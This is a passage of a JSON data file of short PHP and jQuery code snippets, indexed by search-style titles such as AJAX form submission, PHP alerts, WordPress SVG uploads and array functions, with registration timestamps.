    "description": "    var ajaxurl = 'https://example.com/wp-admin/admin-ajax.php';     $.ajax({         url: ajaxurl,         type: 'post',         data: { action: 'register_user' ,\"username\": \"arshia\"},         success: function(response) { console.log(response); }     });\n<?php     // ajax call to this function     function register_user()     {         $username = $_POST['username'];         echo $username;          die();     }      add_action('wp_ajax_register_user', 'register_user');     add_action('wp_ajax_nopriv_register_user', 'register_user');      ?>\n",
    "reg_date": "2021-10-12T10:12:40.000Z"
  },
  {
    "id": 394,
    "keyword": null,
    "link": null,
    "title": " ajax get response from php",
    "description": "One good practice is to use like this:  $.ajax({     type: \"POST\",     url: \"/ajax/request.html\",     data: {action: 'test'},     dataType:'JSON',      success: function(response){         console.log(response.blablabla);         // put on console what server sent back...     } }); and the php part is:  <?php     if(isset($_POST['action']) && !empty($_POST['action'])) {         echo json_encode(array(\"blablabla\"=>$variable));     } ?>\n",
    "reg_date": "2021-10-12T10:12:40.000Z"
  },
  {
    "id": 395,
    "keyword": null,
    "link": null,
    "title": " ajax jquery php",
    "description": " $.ajax({                 type: \"POST\",                 url: \"event.php\",                  data:\"action=chnageChart&value1=\"+id,                 cache: false,                  success: function(html){                       window.location.reload();                 }             });\n$.ajax({   method: \"POST\",   url: \"some.php\",   dataType: \"json\",   data: {} }).done(json => console.log(json)); \n<!doctype html> <html> <head> <script src=\"https://code.jquery.com/jquery-3.3.1.js\" integrity=\"sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=\" crossorigin=\"anonymous\"></script> </head> <body> <form id=\"loginform\" method=\"post\">     <div>         Username:         <input type=\"text\" name=\"username\" id=\"username\" />         Password:         <input type=\"password\" name=\"password\" id=\"password\" />             <input type=\"submit\" name=\"loginBtn\" id=\"loginBtn\" value=\"Login\" />     </div> </form> <script type=\"text/javascript\"> $(document).ready(function() {     $('#loginform').submit(function(e) {         e.preventDefault();         $.ajax({             type: \"POST\",             url: 'login.php',             data: $(this).serialize(),             success: function(response)             {                 var jsonData = JSON.parse(response);                   // user is logged in successfully in the back-end                 // let's redirect                 if (jsonData.success == \"1\")                 {                     location.href = 'my_profile.php';                 }                 else                 {                     alert('Invalid Credentials!');                 }            }        });      }); }); </script> </body> </html> \n $.ajax({     url     : \"file.php\",    method  : \"POST\",         data: {           //key                      :   value           action                   \t:   action ,           key_1   \t\t\t\t\t:   value_key_1,          key_2   \t\t\t\t\t:   value_key_2        }    })     .fail(function() { return false; }) \t// Appel OK    .done(function(data) {     console.log(data);   });\n//Use $.ajax to call a server context (or URL, or whatever) to invoke a particular 'action'. What you want is something like:  $.ajax({ url: '/my/site',          data: {action: 'test'},          type: 'post',          success: function(output) {                       alert(output);                   } }); //On the server side, the action POST parameter should be read and the corresponding value should point to the method to invoke, e.g.:  if(isset($_POST['action']) && !empty($_POST['action'])) {     $action = $_POST['action'];     switch($action) {         case 'test' : test();break;         case 'blah' : blah();break;         // ...etc...     } }   //OR LEARN SOMTHING NEW https://api-tools.getlaminas.org/\n<!doctype html> <html> <head> <script src=\"https://code.jquery.com/jquery-3.3.1.js\" integrity=\"sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=\" crossorigin=\"anonymous\"></script> </head> <body> <form id=\"loginform\" method=\"post\">     <div>         Username:         <input type=\"text\" name=\"username\" id=\"username\" />         Password:         <input type=\"password\" name=\"password\" id=\"password\" />             <input type=\"submit\" name=\"loginBtn\" id=\"loginBtn\" value=\"Login\" />     </div> </form> <script type=\"text/javascript\"> $(document).ready(function() {     $('#loginform').submit(function(e) {         e.preventDefault();         $.ajax({             type: \"POST\",             url: 'login.php',             data: $(this).serialize(),             success: function(response)             {                 var jsonData = JSON.parse(response);                    // user is logged in successfully in the back-end                 // let's redirect                 if (jsonData.success == \"1\")                 {                     location.href = 'my_profile.php';                 }                 else                 {                     alert('Invalid Credentials!');                 }            }        });      }); }); </script> </body> </html> \n",
    "reg_date": "2021-10-12T10:12:41.000Z"
  },
  {
    "id": 396,
    "keyword": null,
    "link": null,
    "title": " ajax php",
    "description": " $.ajax({                 type: \"POST\",                 url: \"event.php\",                  data:\"action=chnageChart&value1=\"+id,                 cache: false,                  success: function(html){                       window.location.reload();                 }             });\n<!doctype html> <html> <head> <script src=\"https://code.jquery.com/jquery-3.3.1.js\" integrity=\"sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=\" crossorigin=\"anonymous\"></script> </head> <body> <form id=\"loginform\" method=\"post\">     <div>         Username:         <input type=\"text\" name=\"username\" id=\"username\" />         Password:         <input type=\"password\" name=\"password\" id=\"password\" />             <input type=\"submit\" name=\"loginBtn\" id=\"loginBtn\" value=\"Login\" />     </div> </form> <script type=\"text/javascript\"> $(document).ready(function() {     $('#loginform').submit(function(e) {         e.preventDefault();         $.ajax({             type: \"POST\",             url: 'login.php',             data: $(this).serialize(),             success: function(response)             {                 var jsonData = JSON.parse(response);                   // user is logged in successfully in the back-end                 // let's redirect                 if (jsonData.success == \"1\")                 {                     location.href = 'my_profile.php';                 }                 else                 {                     alert('Invalid Credentials!');                 }            }        });      }); }); </script> </body> </html> \n $.ajax({     url     : \"file.php\",    method  : \"POST\",         data: {           //key                      :   value           action                   \t:   action ,           key_1   \t\t\t\t\t:   value_key_1,          key_2   \t\t\t\t\t:   value_key_2        }    })     .fail(function() { return false; }) \t// Appel OK    .done(function(data) {     console.log(data);   });\n//Use $.ajax to call a server context (or URL, or whatever) to invoke a particular 'action'. What you want is something like:  $.ajax({ url: '/my/site',          data: {action: 'test'},          type: 'post',          success: function(output) {                       alert(output);                   } }); //On the server side, the action POST parameter should be read and the corresponding value should point to the method to invoke, e.g.:  if(isset($_POST['action']) && !empty($_POST['action'])) {     $action = $_POST['action'];     switch($action) {         case 'test' : test();break;         case 'blah' : blah();break;         // ...etc...     } }   //OR LEARN SOMTHING NEW https://api-tools.getlaminas.org/\norder cancel delivery confirmed using php example website through ajax\n$.ajax({ url: '/my/site',          data: {action: 'test'},          type: 'post',          success: function(output) {                       alert(output);                   } }); \n",
    "reg_date": "2021-10-12T10:12:41.000Z"
  },
  {
    "id": 397,
    "keyword": null,
    "link": null,
    "title": " ajax php form submit",
    "description": "The form is submitting after the ajax request.  <html>   <head>     <script src=\"http://code.jquery.com/jquery-1.9.1.js\"></script>     <script>       $(function () {          $('form').on('submit', function (e) {            e.preventDefault();            $.ajax({             type: 'post',             url: 'post.php',             data: $('form').serialize(),             success: function () {               alert('form was submitted');             }           });          });        });     </script>   </head>   <body>     <form>       <input name=\"time\" value=\"00:00:00.00\"><br>       <input name=\"date\" value=\"0000-00-00\"><br>       <input name=\"submit\" type=\"submit\" value=\"Submit\">     </form>   </body> </html>\n",
    "reg_date": "2021-10-12T10:12:41.000Z"
  },
  {
    "id": 398,
    "keyword": null,
    "link": null,
    "title": " ajax post example php",
    "description": " /* Get from elements values */  var values = $(this).serialize();   $.ajax({         url: \"test.php\",         type: \"post\",         data: values ,         success: function (response) {             // You will get response from your PHP page (what you echo or print)         },         error: function(jqXHR, textStatus, errorThrown) {            console.log(textStatus, errorThrown);         }     }); \n// Variable to hold request var request;  // Bind to the submit event of our form $(\"#foo\").submit(function(event){      // Prevent default posting of form - put here to work in case of errors     event.preventDefault();      // Abort any pending request     if (request) {         request.abort();     }     // setup some local variables     var $form = $(this);      // Let's select and cache all the fields     var $inputs = $form.find(\"input, select, button, textarea\");      // Serialize the data in the form     var serializedData = $form.serialize();      // Let's disable the inputs for the duration of the Ajax request.     // Note: we disable elements AFTER the form data has been serialized.     // Disabled form elements will not be serialized.     $inputs.prop(\"disabled\", true);      // Fire off the request to /form.php     request = $.ajax({         url: \"/form.php\",         type: \"post\",         data: serializedData     });      // Callback handler that will be called on success     request.done(function (response, textStatus, jqXHR){         // Log a message to the console         console.log(\"Hooray, it worked!\");     });      // Callback handler that will be called on failure     request.fail(function (jqXHR, textStatus, errorThrown){         // Log the error to the console         console.error(             \"The following error occurred: \"+             textStatus, errorThrown         );     });      // Callback handler that will be called regardless     // if the request failed or succeeded     request.always(function () {         // Reenable the inputs         $inputs.prop(\"disabled\", false);     });  }); \n",
    "reg_date": "2021-10-12T10:12:41.000Z"
  },
  {
    "id": 399,
    "keyword": null,
    "link": null,
    "title": " ajax request for inserting php data to db",
    "description": "<!DOCTYPE html> <html> <head> \t<title>Insert data in MySQL database using Ajax</title> \t<link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\"> \t<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js\"></script> </head> <body> <div style=\"margin: auto;width: 60%;\"> \t<div class=\"alert alert-success alert-dismissible\" id=\"success\" style=\"display:none;\"> \t  <a href=\"#\" class=\"close\" data-dismiss=\"alert\" aria-label=\"close\">&times;</a> \t</div> \t<form id=\"fupForm\" name=\"form1\" method=\"post\"> \t\t<div class=\"form-group\"> \t\t\t<label for=\"email\">Name:</label> \t\t\t<input type=\"text\" class=\"form-control\" id=\"name\" placeholder=\"Name\" name=\"name\"> \t\t</div> \t\t<div class=\"form-group\"> \t\t\t<label for=\"pwd\">Email:</label> \t\t\t<input type=\"email\" class=\"form-control\" id=\"email\" placeholder=\"Email\" name=\"email\"> \t\t</div> \t\t<div class=\"form-group\"> \t\t\t<label for=\"pwd\">Phone:</label> \t\t\t<input type=\"text\" class=\"form-control\" id=\"phone\" placeholder=\"Phone\" name=\"phone\"> \t\t</div> \t\t<div class=\"form-group\" > \t\t\t<label for=\"pwd\">City:</label> \t\t\t<select name=\"city\" id=\"city\" class=\"form-control\"> \t\t\t\t<option value=\"\">Select</option> \t\t\t\t<option value=\"Delhi\">Delhi</option> \t\t\t\t<option value=\"Mumbai\">Mumbai</option> \t\t\t\t<option value=\"Pune\">Pune</option> \t\t\t</select> \t\t</div> \t\t<input type=\"button\" name=\"save\" class=\"btn btn-primary\" value=\"Save to database\" id=\"butsave\"> \t</form> </div>  <script> $(document).ready(function() { \t$('#butsave').on('click', function() { \t\t$(\"#butsave\").attr(\"disabled\", \"disabled\"); \t\tvar name = $('#name').val(); \t\tvar email = $('#email').val(); \t\tvar phone = $('#phone').val(); \t\tvar city = $('#city').val(); \t\tif(name!=\"\" && email!=\"\" && phone!=\"\" && city!=\"\"){ \t\t\t$.ajax({ \t\t\t\turl: \"save.php\", \t\t\t\ttype: \"POST\", \t\t\t\tdata: { \t\t\t\t\tname: name, \t\t\t\t\temail: email, \t\t\t\t\tphone: phone, \t\t\t\t\tcity: city\t\t\t\t \t\t\t\t}, \t\t\t\tcache: false, \t\t\t\tsuccess: function(dataResult){ \t\t\t\t\tvar dataResult = JSON.parse(dataResult); \t\t\t\t\tif(dataResult.statusCode==200){ \t\t\t\t\t\t$(\"#butsave\").removeAttr(\"disabled\"); \t\t\t\t\t\t$('#fupForm').find('input:text').val(''); \t\t\t\t\t\t$(\"#success\").show(); \t\t\t\t\t\t$('#success').html('Data added successfully !'); \t\t\t\t\t\t \t\t\t\t\t} \t\t\t\t\telse if(dataResult.statusCode==201){ \t\t\t\t\t   alert(\"Error occured !\"); \t\t\t\t\t} \t\t\t\t\t \t\t\t\t} \t\t\t}); \t\t} \t\telse{ \t\t\talert('Please fill all the field !'); \t\t} \t}); }); </script> </body> </html>   \n",
    "reg_date": "2021-10-12T10:12:41.000Z"
  },
  {
    "id": 400,
    "keyword": null,
    "link": null,
    "title": " alert a php variable",
    "description": "echo '<script>alert(\"Message\")</script>';\necho '<script type=\"text/javascript\">alert(\"'.$error.'\");</script>';\n",
    "reg_date": "2021-10-12T10:12:41.000Z"
  },
  {
    "id": 401,
    "keyword": null,
    "link": null,
    "title": " alert in php",
    "description": "echo '<script>alert(\"Message\")</script>';\necho '<script type=\"text/javascript\">alert(\"'.$error.'\");</script>';\n// This is in the PHP file and sends a Javascript alert to the client $message = \"Something\"; echo \"<script type='text/javascript'>alert('$message');</script>\";\necho '<script language=\"javascript\">alert(\"juas\");</script>';\njavascript:alert('Email enviado com Sucesso!'); javascript:window.location='index.php';\n",
    "reg_date": "2021-10-12T10:12:41.000Z"
  },
  {
    "id": 402,
    "keyword": null,
    "link": null,
    "title": " alerta con php",
    "description": "echo '<script>alert(\"Message\")</script>';\necho '<script language=\"javascript\">alert(\"juas\");</script>';\n",
    "reg_date": "2021-10-12T10:12:41.000Z"
  },
  {
    "id": 403,
    "keyword": null,
    "link": null,
    "title": " all cart function woocommerce",
    "description": "// $cart conditionals (if) WC()->cart->is_empty() WC()->cart->needs_payment() WC()->cart->show_shipping() WC()->cart->needs_shipping() WC()->cart->needs_shipping_address() WC()->cart->display_prices_including_tax()   // Get $cart totals WC()->cart->get_cart_contents_count(); WC()->cart->get_cart_subtotal(); WC()->cart->subtotal_ex_tax; WC()->cart->subtotal; WC()->cart->get_displayed_subtotal(); WC()->cart->get_taxes_total(); WC()->cart->get_shipping_total(); WC()->cart->get_coupons(); WC()->cart->get_coupon_discount_amount( 'coupon_code' ); WC()->cart->get_fees(); WC()->cart->get_discount_total(); WC()->cart->get_total(); WC()->cart->total; WC()->cart->get_tax_totals(); WC()->cart->get_cart_contents_tax(); WC()->cart->get_fee_tax(); WC()->cart->get_discount_tax(); WC()->cart->get_shipping_total(); WC()->cart->get_shipping_taxes();    // Loop over $cart items foreach ( WC()->cart->get_cart() as $cart_item_key => $cart_item ) {    $product = $cart_item['data'];    $product_id = $cart_item['product_id'];    $quantity = $cart_item['quantity'];    $price = WC()->cart->get_product_price( $product );    $subtotal = WC()->cart->get_product_subtotal( $product, $cart_item['quantity'] );    $link = $product->get_permalink( $cart_item );    // Anything related to $product, check $product tutorial    $attributes = $product->get_attributes();    $whatever_attribute = $product->get_attribute( 'whatever' );    $whatever_attribute_tax = $product->get_attribute( 'pa_whatever' );    $any_attribute = $cart_item['variation']['attribute_whatever'];    $meta = wc_get_formatted_cart_item_data( $cart_item ); }   // Get $cart customer billing / shipping WC()->cart->get_customer()->get_billing_first_name(); WC()->cart->get_customer()->get_billing_last_name(); WC()->cart->get_customer()->get_billing_company(); WC()->cart->get_customer()->get_billing_email(); WC()->cart->get_customer()->get_billing_phone(); WC()->cart->get_customer()->get_billing_country(); WC()->cart->get_customer()->get_billing_state(); WC()->cart->get_customer()->get_billing_postcode(); WC()->cart->get_customer()->get_billing_city(); WC()->cart->get_customer()->get_billing_address(); WC()->cart->get_customer()->get_billing_address_2(); WC()->cart->get_customer()->get_shipping_first_name(); WC()->cart->get_customer()->get_shipping_last_name(); WC()->cart->get_customer()->get_shipping_company(); WC()->cart->get_customer()->get_shipping_country(); WC()->cart->get_customer()->get_shipping_state(); WC()->cart->get_customer()->get_shipping_postcode(); WC()->cart->get_customer()->get_shipping_city(); WC()->cart->get_customer()->get_shipping_address(); WC()->cart->get_customer()->get_shipping_address_2();   // Other stuff WC()->cart->get_cross_sells(); WC()->cart->get_cart_item_tax_classes_for_shipping(); WC()->cart->get_cart_hash(); WC()->cart->get_customer(); \n // To change add to cart text on single product page add_filter( 'woocommerce_product_single_add_to_cart_text', 'woocommerce_custom_single_add_to_cart_text' );  function woocommerce_custom_single_add_to_cart_text() {     return __( 'Buy Now', 'woocommerce' );  } // To change add to cart text on product archives(Collection) page add_filter( 'woocommerce_product_add_to_cart_text', 'woocommerce_custom_product_add_to_cart_text' );   function woocommerce_custom_product_add_to_cart_text() {     return __( 'Buy Now', 'woocommerce' ); }\n",
    "reg_date": "2021-10-12T10:12:41.000Z"
  },
  {
    "id": 404,
    "keyword": null,
    "link": null,
    "title": " all php error report",
    "description": "// Report all PHP errors error_reporting(E_ALL); //or error_reporting(-1); //or error_reporting(0);\n//PHP functions ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);  //.htaccess php_flag display_startup_errors on php_flag display_errors on php_flag html_errors on php_flag log_errors on php_value error_log  /home/path/public_html/domain/PHP_errors.log\n// Report simple running errors error_reporting(E_ERROR | E_WARNING | E_PARSE);\n",
    "reg_date": "2021-10-12T10:12:41.000Z"
  },
  {
    "id": 405,
    "keyword": null,
    "link": null,
    "title": " allert in php",
    "description": "echo '<script>alert(\"Message\")</script>';\n// This is in the PHP file and sends a Javascript alert to the client $message = \"wrong answer\"; echo \"<script type='text/javascript'>alert('$message');</script>\"; \n",
    "reg_date": "2021-10-12T10:12:42.000Z"
  },
  {
    "id": 406,
    "keyword": null,
    "link": null,
    "title": " allow extension image chrome, firefox",
    "description": "// chrome, firefox 'accept' => 'image/png, image/jpeg'  'type' => 'file', 'class' => 'form-control','label' => __d('static', 'image') . ' ' . __d('static', 'required'), 'multiple', 'accept' => 'image/png, image/jpeg')); ?> \n",
    "reg_date": "2021-10-12T10:12:42.000Z"
  },
  {
    "id": 407,
    "keyword": null,
    "link": null,
    "title": " allow svg wordpress",
    "description": "// Wp v4.7.1 and higher add_filter( 'wp_check_filetype_and_ext', function($data, $file, $filename, $mimes) {   $filetype = wp_check_filetype( $filename, $mimes );   return [       'ext'             => $filetype['ext'],       'type'            => $filetype['type'],       'proper_filename' => $data['proper_filename']   ];  }, 10, 4 );  function cc_mime_types( $mimes ){   $mimes['svg'] = 'image/svg+xml';   return $mimes; } add_filter( 'upload_mimes', 'cc_mime_types' );  function fix_svg() {   echo '<style type=\"text/css\">         .attachment-266x266, .thumbnail img {              width: 100% !important;              height: auto !important;         }         </style>'; } add_action( 'admin_head', 'fix_svg' );\nfunction cc_mime_types($mimes) {  $mimes['svg'] = 'image/svg+xml';  return $mimes; } add_filter('upload_mimes', 'cc_mime_types');\n",
    "reg_date": "2021-10-12T10:12:42.000Z"
  },
  {
    "id": 408,
    "keyword": null,
    "link": null,
    "title": " allowed memory size of bytes exhausted composer",
    "description": "export COMPOSER_MEMORY_LIMIT=-1\nGo to your php.ini file - search for memory_limit and set to -1  memory_limit = -1  *Change it back when done.\n",
    "reg_date": "2021-10-12T10:12:42.000Z"
  },
  {
    "id": 409,
    "keyword": null,
    "link": null,
    "title": " alter row in table laravel",
    "description": "$flight = App\\Flight::find(1);  $flight->name = 'New Flight Name';  $flight->save();\n",
    "reg_date": "2021-10-12T10:12:42.000Z"
  },
  {
    "id": 410,
    "keyword": null,
    "link": null,
    "title": " alterar dado tabela laravel",
    "description": "$flight = App\\Flight::find(1);  $flight->name = 'New Flight Name';  $flight->save();\n",
    "reg_date": "2021-10-12T10:12:42.000Z"
  },
  {
    "id": 411,
    "keyword": null,
    "link": null,
    "title": " angular post phph",
    "description": "$postdata = file_get_contents(\"php://input\"); $request = json_decode($postdata); $email = $request->email; $pass = $request->password; \n",
    "reg_date": "2021-10-12T10:12:42.000Z"
  },
  {
    "id": 412,
    "keyword": null,
    "link": null,
    "title": " apache2 loadmodule php windows",
    "description": "AddHandler application/x-httpd-php .php AddType application/x-httpd-php .php .html LoadModule php7_module \"C:/php7/php7apache2_4.dll\" PHPiniDir \"c:/php7\" \n",
    "reg_date": "2021-10-12T10:12:42.000Z"
  },
  {
    "id": 413,
    "keyword": null,
    "link": null,
    "title": " apache remove index.php",
    "description": "#in apache mod rewrite is disabled a2enmod rewrite\n",
    "reg_date": "2021-10-12T10:12:42.000Z"
  },
  {
    "id": 414,
    "keyword": null,
    "link": null,
    "title": " app service provider laravel register interface sample",
    "description": "// 1:  php artisan make:provider ShopServiceProvider    // 2: in ShopServiceProvider      public function register()     {         $this->app->bind(             Interfaces\\Repositories\\ReviewRepository::class,             Repositories\\ReviewRepositoryImp::class         );           // 3: config/app/php in providers array           /**          * Custom Provider          */         App\\Providers\\ShopServiceProvider::class, \n",
    "reg_date": "2021-10-12T10:12:42.000Z"
  },
  {
    "id": 415,
    "keyword": null,
    "link": null,
    "title": " append new line php",
    "description": "$data = 'some data'.PHP_EOL; $fp = fopen('somefile', 'a'); fwrite($fp, $data);\n",
    "reg_date": "2021-10-12T10:12:42.000Z"
  },
  {
    "id": 416,
    "keyword": null,
    "link": null,
    "title": " append single qoute arounf variable in php string",
    "description": "echo \"'$animal'\";\n",
    "reg_date": "2021-10-12T10:12:43.000Z"
  },
  {
    "id": 417,
    "keyword": null,
    "link": null,
    "title": " append single quote around variable in php string",
    "description": "echo \"'$animal'\";\n",
    "reg_date": "2021-10-12T10:12:43.000Z"
  },
  {
    "id": 418,
    "keyword": null,
    "link": null,
    "title": " append variable into string php",
    "description": "<?php $a = \"Hello \"; $b = $a . \"World!\"; // now $b contains \"Hello World!\"  $a = \"Hello \"; $a .= \"World!\";     // now $a contains \"Hello World!\" ?>\necho \"'$animal'\";\n",
    "reg_date": "2021-10-12T10:12:43.000Z"
  },
  {
    "id": 419,
    "keyword": null,
    "link": null,
    "title": " appending txt file from php",
    "description": "// LOCK_EX will prevent anyone else writing to the file at the same time // PHP_EOL will add linebreak after each line $txt = \"data-to-add\"; $myfile = file_put_contents('logs.txt', $txt.PHP_EOL , FILE_APPEND | LOCK_EX);  // Second option is this $myfile = fopen(\"logs.txt\", \"a\") or die(\"Unable to open file!\"); $txt = \"user id date\"; fwrite($myfile, \"\\n\". $txt); fclose($myfile);\n$log_content=\"This line is logged on 2020-08-14 09:55:00\"; $myfile = fopen(\"log.txt\", \"a\") or die(\"Unable to open file!\"); fwrite($myfile, $log_content); fclose($myfile);\nWonderful\n",
    "reg_date": "2021-10-12T10:12:43.000Z"
  },
  {
    "id": 420,
    "keyword": null,
    "link": null,
    "title": " apply filter wp",
    "description": "<?php  // The filter callback function. function example_callback( $string, $arg1, $arg2 ) {     // (maybe) modify $string.     return $string; } add_filter( 'example_filter', 'example_callback', 10, 3 );  /*  * Apply the filters by calling the 'example_callback()' function  * that's hooked onto `example_filter` above.  *  * - 'example_filter' is the filter hook.  * - 'filter me' is the value being filtered.  * - $arg1 and $arg2 are the additional arguments passed to the callback. $value = apply_filters( 'example_filter', 'filter me', $arg1, $arg2 );  \n",
    "reg_date": "2021-10-12T10:12:43.000Z"
  },
  {
    "id": 421,
    "keyword": null,
    "link": null,
    "title": " applying multiple order by in codeigniter",
    "description": "$this->db->from($this->table_name); $this->db->order_by(\"column1 asc,column2 desc\"); $query = $this->db->get();  return $query->result();\n",
    "reg_date": "2021-10-12T10:12:43.000Z"
  },
  {
    "id": 422,
    "keyword": null,
    "link": null,
    "title": " aravel 8 how to order by using eloquent orm",
    "description": "$posts = Post::orderBy('id', 'DESC')->get(); \n",
    "reg_date": "2021-10-12T10:12:43.000Z"
  },
  {
    "id": 423,
    "keyword": null,
    "link": null,
    "title": " array associativo php",
    "description": "<?php  /*  There are 3 Types of array in php   1. Indexed arrays - Arrays with a numeric index 2. Associative arrays - Arrays with named keys 3. Multidimensional arrays - Arrays containing one or more arrays  This is the second one - Associative arrays */  $age = array(\"Samy\"=>\"35\", \"Naveen\"=>\"37\", \"Amit\"=>\"43\"); echo \"Mr.Samy is \" . $age['Samy'] . \" years old.\";  ?>\nfunction isAssoc(array $arr) {     if (array() === $arr) return false;     return array_keys($arr) !== range(0, count($arr) - 1); }  var_dump(isAssoc(['a', 'b', 'c'])); // false var_dump(isAssoc([\"0\" => 'a', \"1\" => 'b', \"2\" => 'c'])); // false var_dump(isAssoc([\"1\" => 'a', \"0\" => 'b', \"2\" => 'c'])); // true var_dump(isAssoc([\"a\" => 'a', \"b\" => 'b', \"c\" => 'c'])); // true \n<?php \t$associativeArray = [         \"carOne\" => \"BMW\",         \"carTwo\" => \"VW\",         \"carThree\" => \"Mercedes\"     ];          echo $associativeArray[\"carTwo\"] . \" Is a german brand\"; ?>\n<?php  /*  There are 3 Types of array in php   1. Indexed arrays - Arrays with a numeric index 2. Associative arrays - Arrays with named keys 3. Multidimensional arrays - Arrays containing one or more arrays  This is the second one - Associative arrays */  $age = array(\"Samy\"=>\"35\", \"Naveen\"=>\"37\", \"Amit\"=>\"43\"); echo \"Mr.Samy is \" . $age['Peter'] . \" years old.\";  ?>\n<?php    /*   there are three type of array   \t1 - Indexed array   */  \t$a = array('a','b','c'); \t$b = ['a','b','c']; \t/*     2 - Associative array     */ \t$c = array(     \t'keyOne'=>'valueOne',       \t'keyTwo'=>'valueTwo'     ); \t$d = [       'keyOne'=>'valueOne',       'keyTwo'=>'valueTwo'     ]; /*     3 - Multidimensional  array     */ \t$c = array(     \t'keyOne'=>array('a','b','c'),       \t'keyTwo'=>array('a'=>'1','b'=>'2')     ); \t$d = [       'keyOne'=>['a','b','c'],       \t'keyTwo'=>['a'=>'1','b'=>'2']     ];   ?>\n<?php $arr = array('fruit' => 'mango', 'vegetable' => 'tomato', 'thing' => 'bag'); echo $arr['fruit']; /*OUTPUT mango*/ ?> \n",
    "reg_date": "2021-10-12T10:12:43.000Z"
  },
  {
    "id": 424,
    "keyword": null,
    "link": null,
    "title": " array column in php",
    "description": "$a = array(   array(     'id' => 5698,     'first_name' => 'Peter',     'last_name' => 'Griffin',   ),   array(     'id' => 4767,     'first_name' => 'Ben',     'last_name' => 'Smith',   ),   array(     'id' => 3809,     'first_name' => 'Joe',     'last_name' => 'Doe',   ) );  $last_names = array_column($a, 'last_name'); print_r($last_names);\n",
    "reg_date": "2021-10-12T10:12:43.000Z"
  },
  {
    "id": 425,
    "keyword": null,
    "link": null,
    "title": " array combine function in php",
    "description": "/* Array_combine is inbuilt function in php, which is use to combine two array in key value pair */ /* make sure both array should be of same length */  <?php $fname=array(\"Peter\",\"Ben\",\"Joe\"); $age=array(\"35\",\"37\",\"43\");  $c=array_combine($fname,$age); print_r($c); ?>  /* Output: Array ( [Peter] => 35 [Ben] => 37 [Joe] => 43 ) */    /* I hope it will help you. Namaste Stay home stay safe */\n",
    "reg_date": "2021-10-12T10:12:43.000Z"
  },
  {
    "id": 426,
    "keyword": null,
    "link": null,
    "title": " array con php",
    "description": "array(     clave  => valor,     clave2 => valor2,     clave3 => valor3,     ...     )\n",
    "reg_date": "2021-10-12T10:12:44.000Z"
  },
  {
    "id": 427,
    "keyword": null,
    "link": null,
    "title": " array constant in php",
    "description": "<?php define(\"vehicles\", [   \"car\",   \"bike\",   \"jcb\" ]); echo vehicles[0];\t\t//car ?>\n<?php     const ANIMALS = array('dog', 'cat', 'ant');     define('ANIMALS', array('dog', 'cat', 'ant')); ?>\n",
    "reg_date": "2021-10-12T10:12:44.000Z"
  },
  {
    "id": 428,
    "keyword": null,
    "link": null,
    "title": " array count items",
    "description": "<?php \t$arr = [\"one\", \"two\", \"three\", \"four\"]; \techo count($arr);   ?>\n// using count() we can get proper length of the array $names = array(\"Ankur\",\"Raj\",\"Ram\",\"Suresh\"); // pass array into count() as parameter it will return array length echo count($names);  // output : 4\n//#Source https://bit.ly/2neWfJ2  const countOccurrences = (arr, val) => arr.reduce((a, v) => (v === val ? a + 1 : a), 0); console.log(countOccurrences([1, 1, 2, 1, 2, 3], 1)); console.log(countOccurrences([1, 1, 2, 1, 2, 3], 2)); console.log(countOccurrences([1, 1, 2, 1, 2, 3], 3));  \n",
    "reg_date": "2021-10-12T10:12:44.000Z"
  },
  {
    "id": 429,
    "keyword": null,
    "link": null,
    "title": " array diff",
    "description": " <?php $array1 = array(\"a\" => \"green\", \"red\", \"blue\", \"red\"); $array2 = array(\"b\" => \"green\", \"yellow\", \"red\"); $result = array_diff($array1, $array2);  print_r($result); ?>  Array (     [1] => blue )\n<?php $arr_1 = array(\"a\" => \"car\", \"b\" => \"plane\", \"c\" => \"boat\", \"d\" => \"bike\"); $arr_2 = array(\"e\" => \"car\", \"f\" => \"plane\", \"g\" => \"boat\");  $result = array_diff($arr_1, $arr_2); print_r($result);  /* Result: Array (     [d] => bike )  */ \n<?php $array1 = array(\"a\" => \"green\", \"red\", \"blue\", \"red\"); $array2 = array(\"b\" => \"green\", \"yellow\", \"red\"); $result = array_diff($array1, $array2); ?>  Array (     [1] => blue )\n",
    "reg_date": "2021-10-12T10:12:44.000Z"
  },
  {
    "id": 430,
    "keyword": null,
    "link": null,
    "title": " array diff php",
    "description": " <?php $array1 = array(\"a\" => \"green\", \"red\", \"blue\", \"red\"); $array2 = array(\"b\" => \"green\", \"yellow\", \"red\"); $result = array_diff($array1, $array2);  print_r($result); ?>  Array (     [1] => blue )\n<?php $arr_1 = array(\"a\" => \"car\", \"b\" => \"plane\", \"c\" => \"boat\", \"d\" => \"bike\"); $arr_2 = array(\"e\" => \"car\", \"f\" => \"plane\", \"g\" => \"boat\");  $result = array_diff($arr_1, $arr_2); print_r($result);  /* Result: Array (     [d] => bike )  */ \n<?php $array1 = array(\"a\" => \"green\", \"red\", \"blue\", \"red\"); $array2 = array(\"b\" => \"green\", \"yellow\", \"red\"); $result = array_diff($array1, $array2); ?>  Array (     [1] => blue )\nPHP function array_diff(array $array1, array $array2, array ...$_) int[] --------------------------------------------------------------------   Computes the difference of arrays.    Parameters: array--$array1--The array to compare from array--$array2--An array to compare against array--...$_--[optional]    Returns: an array containing all the entries from array1 that are not present in any of the other arrays.\n",
    "reg_date": "2021-10-12T10:12:44.000Z"
  },
  {
    "id": 431,
    "keyword": null,
    "link": null,
    "title": " array empty check in php",
    "description": "if (empty($array)) {      // list is empty. }\n// Declare an array and initialize it  $non_empty_array = array('apples' => '2');     // Declare an empty array  $empty_array = array();     // Condition to check array is empty or not  if(!empty($non_empty_array)) {     echo \"Given Array is not empty <br>\";  } if(empty($empty_array)) {     echo \"Given Array is empty\";  }\n",
    "reg_date": "2021-10-12T10:12:44.000Z"
  },
  {
    "id": 432,
    "keyword": null,
    "link": null,
    "title": " array fill php",
    "description": "<?php $arr_fill = array_fill(5, 5, \"PHP\");  echo \"<pre>\"; print_r($arr_fill); echo \"</pre>\"; ?>\narray_fill ( int $start_index , int $num , mixed $value ) : array\n",
    "reg_date": "2021-10-12T10:12:44.000Z"
  },
  {
    "id": 433,
    "keyword": null,
    "link": null,
    "title": " array filter use key",
